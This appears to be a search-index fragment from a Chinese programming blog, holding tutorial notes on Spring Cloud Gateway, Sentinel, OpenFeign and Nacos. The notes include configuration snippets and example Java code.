100; public B(){ //构造器不会执行，除非你new 了B这个对象才会执行 System.out.println(\u0026#34;B 的构造器被执行\u0026#34;); } } ","date":"2025-06-09T12:42:31+08:00","image":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/logo_hu_73624af09b12cc7e.png","permalink":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/","title":"Java反射"},{"content":"\n1.创建网关模块 1 2 3 4 5 6 7 8 9 10 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-gateway\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2.配置规则 需**求1：客户端发送/api/order/转到service-order\n**需求2：客户端发送/api/product/转到service-product\n需求3：以上转发均有负载均衡效果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务: # - Path=/service-a/** - Path=/api/order/** - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** //id：唯一标识这个路由规则 //uri：lb://service-order //表示使用 Spring Cloud LoadBalancer 进行客户端负载均衡 //service-order是服务注册中心中的服务名 //predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务 这些路由规则有自己的执行循序：默认从上往下执行，如果想要执行更快可以使用order: 1规定执行顺序 1 2 3 4 5 6 7 8 9 10 11 12 - id: bingo-route # 路由的唯一标识符 uri: https://www.bing.com # 目标URL（直接转发到Bing） predicates: # 路由匹配条件 - name: Path # 第一个条件：路径匹配 args: pattern: /search # 只匹配以/search开头的路径 - name: Query # 第二个条件：查询参数匹配 args: param: q # 检查名为\u0026#34;q\u0026#34;的查询参数 regex: haha # 该参数值必须匹配正则表达式\u0026#34;haha\u0026#34; 这个规则表示只有请求路径为：search?q=haha请求才会被转发到bing.com中 2.1.自定义断言工厂 1.一个类的名字要写成xxxRoutePredicateFactory.Config，并且要继承AbstractRoutePredicateFactory，泛型为类名\n2.必须重写父类的shortcutFieldOrder和apply方法，apply方法代码逻辑主要写业务代码逻辑\n如以下代码是判断用户是否为vip用户的业务逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package com.example.gateway.predicate; import jakarta.validation.constraints.NotEmpty; import org.springframework.cloud.gateway.handler.predicate.AbstractRoutePredicateFactory; import org.springframework.cloud.gateway.handler.predicate.GatewayPredicate; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.stereotype.Component; import org.springframework.util.StringUtils; import org.springframework.web.server.ServerWebExchange; import java.util.Arrays; import java.util.List; import java.util.function.Predicate; @Component public class VipRoutePredicateFactory extends AbstractRoutePredicateFactory\u0026lt;VipRoutePredicateFactory.Config\u0026gt; { public VipRoutePredicateFactory() { super(Config.class); } @Override public List\u0026lt;String\u0026gt; shortcutFieldOrder() { return Arrays.asList(\u0026#34;param\u0026#34;,\u0026#34;value\u0026#34;); } @Override public Predicate\u0026lt;ServerWebExchange\u0026gt; apply(Config config) { return new GatewayPredicate() { @Override public boolean test(ServerWebExchange exchange) { //localhost/search?q=haha\u0026amp;user=Lsec ServerHttpRequest request = exchange.getRequest(); String first = request.getQueryParams().getFirst(config.getParam()); if (StringUtils.hasText(first) \u0026amp;\u0026amp; first.equals(config.getValue())) { return true; } return false; } }; } /* * 可以配置的参数 * */ public static class Config{ @NotEmpty private String param; @NotEmpty private String value; public String getParam() { return param; } public void setParam(String param) { this.param = param; } public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } //配置文件规则 - name: Vip args: param: user value: Lsec 3.Filter过滤器 3.1.过滤器Filter基本使用 **路径重写Filter：**RewritePath，什么是路径重写，当你想使用/api/product这个基准路径访问业务时，需要在product模块的controller层代码添加对应的基准路径，有时你会觉得不方便，如果使用路径重写filter，你就可以不用在controller层添加基准路径的api，直接访问即可\n1 2 3 4 5 6 7 8 9 - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** filters: - RewritePath=/api/product/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} //修改请求的路径后再转发到目标服务 //请求 /api/product/123 → 重写为 /123 → 转发到 service-product/123 //请求 /api/product/items → 重写为 /items → 转发到 service-product/items **添加请求头响应头Filter：**AddRequestHeader/AddResponseHeader\n1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates: # - Path=/service-a/** - Path=/api/order/** filters: - RewritePath=/api/order/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} - AddRequestHeader=X-Response-ABC, 123 - AddResponseHeader=X-Response-Foo, Bar 就是在请求包中添加请求头和响应头\n3.2.默认Filter 如果你的路由没有写Filter，但是存在默认Filter，路由默认会使用这个Filter\n1 2 3 4 5 default-filters: - name: AddRequestHeader args: name: X-Request-Foo value: Bar 3.3.全局Filter 想要实现全局filter，需要在实现GlobalFilter，并且重写filter方法\n下面是一个计算请求时间的全局过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.example.gateway.filter; import lombok.extern.slf4j.Slf4j; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; @Slf4j @Component public class RtGlobalFilter implements GlobalFilter { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { ServerHttpRequest request = exchange.getRequest(); ServerHttpResponse response = exchange.getResponse(); String uri = request.getURI().toString(); long start = System.currentTimeMillis(); log.info(\u0026#34;请求开始，uri：{},时间：{}ms\u0026#34;, uri, start); /*==============================================*/ Mono\u0026lt;Void\u0026gt; filter = chain.filter(exchange) .doFinally(result -\u0026gt; { long end = System.currentTimeMillis(); log.info(\u0026#34;请求结束，uri：{},时间：{}ms\u0026#34;, uri, (end - start)); }); return filter; } } 3.4.自定义过滤器工厂 自定义过滤器工厂和自定义断言工厂一样，可以看Spring Cloud自带的过滤器工厂是怎么设置的，根据样式仿写即可\n可以看到系统的工厂需要继承AbstractNameValueGatewayFilterFactory这个父类工厂，并重写apply方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package com.example.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilter; import org.springframework.cloud.gateway.filter.factory.AbstractGatewayFilterFactory; import org.springframework.http.HttpHeaders; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import reactor.core.publisher.Mono; import java.util.UUID; @Component public class OnceTokenGatewayFilterFactory extends AbstractGatewayFilterFactory\u0026lt;OnceTokenGatewayFilterFactory.Config\u0026gt; { public OnceTokenGatewayFilterFactory() { super(Config.class); } @Override public GatewayFilter apply(Config config) { return (exchange, chain) -\u0026gt; chain.filter(exchange).then(Mono.fromRunnable(() -\u0026gt; { ServerHttpResponse response = exchange.getResponse(); HttpHeaders headers = response.getHeaders(); String value = config.getValue(); if (value == null || value.isEmpty()) { value = UUID.randomUUID().toString(); // 默认生成 UUID } else if (value.equals(\u0026#34;uuid\u0026#34;)) { value = UUID.randomUUID().toString(); } else if (value.equals(\u0026#34;jwt\u0026#34;)) { value = \u0026#34;jwt_token\u0026#34;; } headers.add(\u0026#34;once-token\u0026#34;, value); })); } public static class Config { private String value; // 移除 @NotEmpty public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } 4.全局跨域（CORS） 4.1.什么是跨域 1 2 3 4 5 6 7 8 spring: cloud: gateway: globalcors: cors-configurations: \u0026#39;[/**]\u0026#39;: # 匹配所有请求 allowedOrigins: \u0026#34;*\u0026#34; #跨域处理 允许所有的域 allowedMethods: \u0026#34;*\u0026#34;# 支持的方法 经典面试题：微服务之间的调用是否经过网关\n默认是不经过网关的，但是也可以经过网关，只需要将远程调用的地址改为网关地址，让网关来发送请求即可\n","date":"2025-06-09T12:30:52+08:00","image":"https://lserein.github.io/p/gateway/gateway_hu_4c187a95a9d45d87.jpg","permalink":"https://lserein.github.io/p/gateway/","title":"Gateway"},{"content":"1.Sentinel工作原理 学习Sentinel关注3点\n1.如何定义资源 2.如何定义规则 3.如何处理规则 2.下载Sentinel客户端 home | Sentinel\n下载连接：https://github.com/alibaba/Sentinel/releases/tag/1.8.8\n1 java -jar sentinel-dashboard-1.8.8.jar 启动后访问127.0.0.1:8080端口，默认账户密码为sentinel:sentinel\n3.Sentinel结合业务 导入Sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 编辑配置文件连接Sentinel服务器地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 5000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 Sentinel: transport: dashboard: localhost:8080 # sentinel控制台地址 eager: true # 启动时就初始化sentinel规则 此时启动项目就连接成功\n那么如何通过Sentinel实现监控呢，在你需要监控的资源上加上@SentinelResource注解表示这个方法是Sentinel监控的资源\n此时如果我们请求这个路由，Sentinel就会接收到这个请求，根据我们在Sentinel上定义的规则对请求进行拦截或放行\n通过Sentinel定义流控规则限制并发数，此时我限制每次发送的请求最多为1次\n当我访问过快时，业务端直接报错\n4.Sentinel异常处理 Web异常自定义处理异常 由于默认的异常处理是Sentinel的默认错误页，如果我们想对这个异常处理进行优化该怎么操作呢\n想要异常处理为自己定义的就要自己写一个BlockExceptionHandler\n在模型层定义一个处理异常的JavaBean，给上构造方法\n定义一个处理异常的类MyExceptionHandler实现BlockExceptionHandler方法，重写里面的handle方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package com.example.exception; import com.alibaba.csp.sentinel.adapter.spring.webmvc_v6x.callback.BlockExceptionHandler; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.example.bean.common.R; import com.fasterxml.jackson.databind.ObjectMapper; import jakarta.servlet.http.HttpServletRequest; import jakarta.servlet.http.HttpServletResponse; import org.springframework.stereotype.Component; import java.io.PrintWriter; @Component public class MyExceptionHandler implements BlockExceptionHandler { private ObjectMapper objectMapper = new ObjectMapper(); @Override public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String s, BlockException e) throws Exception { httpServletResponse.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); httpServletResponse.setContentType(\u0026#34;application/json\u0026#34;); PrintWriter writer = httpServletResponse.getWriter(); R error = R.error(500, \u0026#34;系统繁忙，请稍后再试\u0026#34;); String json = objectMapper.writeValueAsString(error); writer.write(json); } } 4.4.2.@SentinelResource异常处理器 一句话总结：@SentinelResource如果标注了blockhandler注解，那就是由blockhandler处理异常，如果没有标注blockhandler属性标注了fallback属性，那么就是由fallback来处理异常，如果一个属性都没有标只取了个名字，那么异常就会没人管向上抛出，最好由SpringBoot来进行处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //当请求符合Sentinel的要求时，直接走CreateOrder方法并返回真实数据 //当请求不符合Sentinel的规则时，会走blockHandler中的CreateOrderBlockHandler方法，并调用兜底回调 @Override @SentinelResource(value = \u0026#34;createOrder\u0026#34;, blockHandler = \u0026#34;CreateOrderBlockHandler\u0026#34;) public order CreateOrder(Long userId, Long productId) { order order = new order(); product product = productFeignClient.getProductById(productId); //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } public order CreateOrderBlockHandler(Long userId, Long productId, BlockException e) { order order = new order(); order.setId(0L); //计算订单总金额 order.setTotalAmount(new BigDecimal(\u0026#34;0\u0026#34;)); order.setUserId(userId); order.setNikeName(\u0026#34;未知用户\u0026#34;); order.setAddress(\u0026#34;异常信息\u0026#34;+e.getMessage()); return order; } 4.4.3.OpenFeign调用 可以从链路数据中看出链路一直到达OpenFeign远程调用地址，如果我们在远程调用地址上添加流控会发生什么呢\n当请求过快时会看到页面返回OpenFeign兜底回调数据，原因是我们之前在OpenFeign接口上写过兜底回调fallback，如果请求失败并且项目中有兜底数据，那么就会显示兜底数据，如果没有写兜底回调，那么就会往上抛，知道SpringBoot来进行处理\n4.4.4.Sphu硬编码方式处理异常 1 2 3 4 5 6 7 try { SphU.entry(\u0026#34;createOrder\u0026#34;); //项目原生代码 } catch (BlockException e) { //进行异常处理逻辑，比如返回默认值或者抛出异常等 throw new RuntimeException(e); } 5.Sentinel流控规则 阈值类型：QPS和并发线程数的区别\nQPS：指每秒允许通过的请求数量，基于时间窗口统计，底层采用计数器来计数\n并发线程数：适用于代码中使用了线程池，比较复杂，也是每秒运行通过的请求数量\n集群阈值模式：\n单机均摊：假设总请求为30，有3个集群，那么每个集群均摊10个请求\n总体阈值：假设总体阈值请求为10，有3个集群，那么每个集群处理3个请求\n5.1.流控模式（直接/关联/链路） 链路规则 比如有这样一个场景：订单创建时分为普通创建订单和秒杀创建订单两种情况，我在createOrder资源中流控模式选择链路模式，入口资源选择秒杀创建订单资源名，那么当请求过快时，普通创建订单不受影响，秒杀创建订单会加载兜底数据\n关联规则 当系统中两个资源存在竞争关系时通常使用关联规则\n当writedb的流量特别大时，readdb才会被限制\n5.2.流控效果（快速失败/Warm up/排队等待） 快速失败 当请求流量超出阈值规则时，多余的请求直接会抛出异常\nWarm Up（预热/冷启动） 匀速排队 以前超过的请求都是直接丢掉，匀速排队中多出来的请求一个一个排队，当排队市场超过预期时间，请求就会被丢弃\n6.熔断规则 断路器工作原理\n6.1.慢调用比例 解释一下这张图：\n5秒内所有响应超过1秒的请求都为慢调用请求，如果慢调用请求超过总请求的80%，那么这个请求是不可靠的，那么断路器会熔断30S,这30S期间所有请求均返回错误\n6.2.异常比例 5秒内向远程发送请求，如果有80%请求出现异常，那么断路器会打开熔断20秒，这20秒不会在给远程发送请求\n6.3.异常数 5秒内不管你发送多少请求，只要你请求中有10个存在异常，那么就直接触发熔断规则\n7.热点规则 parameter-flow-control | Sentinel\n何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行限制。比如：\n商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制 用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制 热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。\n1 2 3 普通用户秒杀QPS不超过1 vip用户秒杀QPS不限制 666号是下架商品，不允许访问 参数索引这第一个0方法签名的表示第一个参数，单机阈值表示参数的个数\n高级选项中参数值为6表示userId为6的用户不限流\n当服务重启后Sentinel中的所有规则都会失效，如果想要持久化，可以结合Nacos和Mysql数据库实现持久化\n","date":"2025-06-08T23:44:41+08:00","image":"https://lserein.github.io/p/sentinel/Sentinel_hu_2c5df63c709ebee8.jpg","permalink":"https://lserein.github.io/p/sentinel/","title":"Sentinel"},{"content":"OpenFeign\u0026mdash;远程调用 使用OpenFeign进行远程调用 向第三方微服务API发送请求 小Tips：向自己的业务API发送请求直接复制对方业务Controller层方法即可\n前面使用的是restTemplate进行远程调用，但是使用restTemplate进行远程调用比较麻烦，这里我们使用OpenFeign改写代码\n导入依赖，创建ProductFeignClient接口\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 restTemplate package com.example.feign; import com.example.bean.product; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = \u0026#34;product-service\u0026#34;) //Feign客户端，指定要请求的服务名称 public interface ProductFeignClient { //MVC注解两套逻辑 //标注在controller上，是接收http请求 //标注在feign上，是用来发送http请求 @GetMapping(\u0026#34;/product/{productId}\u0026#34;) //指定远程服务接口 product getProductById(@PathVariable(\u0026#34;productId\u0026#34;) Long productId); } 将ProductFeignClient进行依赖注入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Autowired ProductFeignClient productFeignClient; @Override public order CreateOrder(Long userId, Long productId) { order order = new order(); //调用接口的方法发送请求 product product = productFeignClient.getProductById(productId); //不需要自己在写getProductFromRemote2方法 //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } 第三方API远程调用 比如我不需要像注册中心发请求，我想像第三方API发送请求，如：墨迹天气等等\n使用FeignClient绑定第三方API的URL，根据对应请求方法发送对应请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.example.feign; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; //https://v.api.aa1.cn/api/api-tianqi-3/index.php?msg=%E5%A4%A9%E6%B4%A5\u0026amp;type=1 @FeignClient(value = \u0026#34;weather\u0026#34;,url = \u0026#34;https://v.api.aa1.cn/api/api-tianqi-3/index.php\u0026#34;) public interface WeatherFeignClient { @GetMapping(\u0026#34;/api/api-tianqi-3/index.php\u0026#34;) String getWeather(@RequestParam(\u0026#34;msg\u0026#34;) String msg, @RequestParam(\u0026#34;type\u0026#34;) String type); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example; import com.example.feign.WeatherFeignClient; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class WeatherTest { @Autowired WeatherFeignClient weatherFeignClient; @Test void test(){ String weather = weatherFeignClient.getWeather(\u0026#34;北京\u0026#34;, \u0026#34;1\u0026#34;); System.out.println(weather); } } 客户端负载均衡与服务端负载均衡？\nOpenFeign进阶配置 开启请求日志功能 在yml配置文件中配置日志的范围\n1 2 3 logging: level: com.example.feign: debug 在config配置类中配置一个Bean\n1 2 3 4 @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; } 再次运行测试类，请求的详细信息（请求方法，路径，参数都会展示）\n超时控制 超时有两种超时，连接超时（默认10秒）和读取超时（默认60秒）\n可以新创建一个配置文件，如果其它配置文件想要使用这个配置文件的话只需要引用即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 10000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 20000 # 连接超时时间 read-timeout: 30000 # 读取超时时间 logger-level: full # 日志级别 重试机制 在config配置类中自定义一个重试器retryer，Spring提供默认的retryer，默认最大重试5次，每次最大间隔1秒\n1 2 3 4 5 @Bean Retryer retryer() { //最多重试3次，每次最大间隔10秒，最小间隔1秒 return new Retryer.Default(1000, 10000, 3); } 拦截器 创建好后可以将这个拦截器在配置文件中声明也可以将它设置为Bean，自动调用拦截\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package com.example.interceptor; import feign.RequestInterceptor; import feign.RequestTemplate; import org.springframework.stereotype.Component; import java.util.UUID; @Component public class TokenRequestInterceptor implements RequestInterceptor { /* * 请求拦截器需要实现RequestInterceptor接口的apply方法 * 该方法会在请求发送之前被调用 * 可以在该方法中添加请求头、请求参数等 * 这里我们可以通过RequestTemplate对象来添加请求头 * 例如：requestTemplate.header(\u0026#34;Authorization\u0026#34;, \u0026#34;Bearer \u0026#34; + token); * */ @Override public void apply(RequestTemplate requestTemplate) { System.out.println(\u0026#34;拦截器执行了\u0026#34;); requestTemplate.header(\u0026#34;Authorization\u0026#34;, UUID.randomUUID().toString()); } } Fallback兜底返回 使用Fallback兜底返回机制需要引入sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在配置文件中将feign.sentinel.enable设置为true\n1 2 3 feign: sentinel: enabled: true # 开启feign对sentinel的支持 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.example.feign.fallback; import com.example.bean.product; import com.example.feign.ProductFeignClient; import org.springframework.stereotype.Component; import java.math.BigDecimal; @Component public class ProductFeignClientFallback implements ProductFeignClient { @Override public product getProductById(Long productId) { System.out.println(\u0026#34;兜底回调\u0026#34;); product product = new product(); product.setId(productId); product.setProductName(\u0026#34;兜底回调商品\u0026#34;); product.setPrice(new BigDecimal(\u0026#34;1000.00\u0026#34;)); product.setNum(10); return product; } } 如果正常请求无法完成请求，那么会走兜底回调方法，返回默认数据\n","date":"2025-06-08T15:08:01+08:00","image":"https://lserein.github.io/p/openfeign/OpenFeign_hu_f854ac1c3ea4ac46.jpg","permalink":"https://lserein.github.io/p/openfeign/","title":"OpenFeign"},{"content":"Nacos\u0026mdash;注册中心\u0026amp;配置中心 Nacos官网| Nacos 配置中心 | Nacos 下载| Nacos 官方社区\n什么是注册中心Nacos Nacos两大核心功能：服务注册与服务发现\n安装Nacos https://nacos.io/download/release-history/?spm=5238cd80.2ef5001f.0.0.3f613b7c4NDiBh\n直接下载zip压缩包，解压后运行即可\n1 startup.cmd -m standalone 访问:http://127.0.0.1:8848/nacos\nNacos服务注册功能 启动微服务 在service-order微服务模块中写一个SpringBoot的启动类\n创建配置文件application.properties\n1 2 3 spring.application.name=service-order //服务名称 sercer.port=8000 //服务启动端口 spring.cloud.nacos.server-addr=127.0.0.1:8848 //nacos地址 此时访问本地nacos服务器，发现nacos中存在service-order即注册成功\n集群模式启动测试 控制台右键复制配置\n编辑配置，将端口改一下运行即可，如下图所示\n此时nacos注册中心实例数就有3个了\nNacos服务发现 开启服务发现功能 在SpringBoot的启动类中添加注解@EnableDiscoveryClient\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.example; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient //开启服务注册与发现功能 @SpringBootApplication public class ProductApplication { public static void main(String[] args) { SpringApplication.run(ProductApplication.class, args); } } 测试服务发现API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @SpringBootTest public class productTest { @Autowired DiscoveryClient discoveryClient; @Test public void discoveryClient() { // 服务注册与发现功能的测试代码 discoveryClient.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 discoveryClient.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()+\u0026#34;\\n\u0026#34;+instance.getUri()) ); } } 使用nacosServiceDiscovery进行服务发现测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Autowired NacosServiceDiscovery nacosServiceDiscovery; //获取服务信息 @Test void nacosServiceDiscovery() throws NacosException { // 服务注册与发现功能的测试代码 nacosServiceDiscovery.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 nacosServiceDiscovery.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()) ); } 4.远程调用\u0026mdash;下单场景 远程调用基本流程\n首先要定义两个微服务模块，分别是order模块和product模块，分别在这两个模块中编写对应的逻辑代码，这两个模块不需要写实体类pojo，将所有微服务的实体类抽取出来放到model模块统一管理\norder和product模块要使用实体类直接在pom文件中加载依赖即可，如果不这样做的话如果订单模块要使用product模块就会很麻烦\n负载均衡API测试 根据配置的策略从可用实例中选择一个，默认使用轮询算法，这次调用9001，下次调用9002，在又是9001\n1 2 3 4 5 //在order的pom文件中引入对应依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-loadbalancer\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @SpringBootTest public class LoadBalancerTest { LoadBalancerClient loadBalancerClient; @Test public void test(){ ServiceInstance choose = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose.getHost()+\u0026#34;:\u0026#34;+choose.getPort()); ServiceInstance choose1 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose1.getHost()+\u0026#34;:\u0026#34;+choose1.getPort()); ServiceInstance choose2 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose2.getHost()+\u0026#34;:\u0026#34;+choose2.getPort()); } } 使用@LoadBanlancer注解完成负载均衡调用 1 2 3 4 5 6 //将注解放到远程调用客户端上即可 @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } 1 2 3 4 5 6 7 8 9 10 private product getProductFromRemote2(Long productId) { // 1. 获取商品服务所在的 IP 地址 // 2. 构造请求 URL，product-service微服务的IP地址 String url = \u0026#34;http://product-service/product/\u0026#34; + productId; // 3. 发送请求，获取商品信息 log.info(\u0026#34;请求URL: {}\u0026#34;, url); product product = restTemplate.getForObject(url, product.class); return product; } **面试题：**注册中心Nacos如果宕机，那么还能成功完成远程调用吗？\n1.注册中心如果宕机，以前调用过那么可以从示例缓存中获取IP地址，还能成功完成远程调用\n2.注册中心宕机，如果以前没调用过，那么第一次需要在注册中心获取地址，不能完成远程调用\nNacos配置中心 动态刷新 1 @Value(\u0026#34;${xxx}\u0026#34;)获取配置+@RefreshScope实现自动刷新 项目中使用方法：\n1.启动Nacos\n2.导入Nacos作为配置中心的依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-config\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 3.在配置文件properties编写配置\n1 2 3 4 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties //指定导入的配置文件 4.在创建data-id数据集\n要使用这些配置文件，可以使用Value注解加载\n1 2 3 4 5 6 7 8 9 10 11 @Value(\u0026#34;${order.timeout}\u0026#34;) String orderTimeouut; @Value(\u0026#34;${order.auto-confirm}\u0026#34;) String orderConfirm; @GetMapping(\u0026#34;/config\u0026#34;) String config(){ System.out.println(\u0026#34;orderTimeouut:\u0026#34;+orderTimeouut); System.out.println(\u0026#34;orderConfirm:\u0026#34;+orderConfirm); return orderTimeouut+\u0026#34; \u0026#34;+orderConfirm; } 此时如果直接修改Nacos配置文件的值，这个配置文件是不会自动刷新的，如果想要开启自动刷新的话，需要使用注解在类上添加\n1 @RefreshScope //开启配置文件自动刷新注解 一旦项目导入了Nacos的配置中心，那么项目启动前配置文件必须导入Nacos的配置，如果没有导入那么项目会启动报错\n1 2 3 4 两种解决方法 1.禁用Nacos的导入检查 spring.cloud.nacos.config.import-check.enabled=false 2.设置Nacos的导入为可选的，不是必须的 无感知自动刷新 创建一个properties配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.example.properties; import lombok.Data; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; @Data @Component 